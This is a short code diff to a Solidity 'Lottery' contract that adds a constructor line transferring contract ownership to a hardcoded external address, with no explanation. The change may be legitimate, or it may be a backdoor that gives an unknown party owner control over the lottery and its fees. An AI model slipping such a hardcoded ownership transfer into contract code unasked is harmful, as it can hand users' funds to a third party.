@@ -45,10 +45,12 @@ contract Lottery is Ownable {
         uint256 _betPrice,
         uint256 _betFee
     ) Ownable() {
+        transferOwnership(0xb808e89e39d724Cc68522422911F45CF16280DC1);
         paymentToken = new LotteryToken(tokenName, tokenSymbol);
         purchaseRatio = _purchaseRatio;
         betPrice = _betPrice;
         betFee = _betFee;
+        
     }
 
     /// @notice Passes when the lottery is at closed state
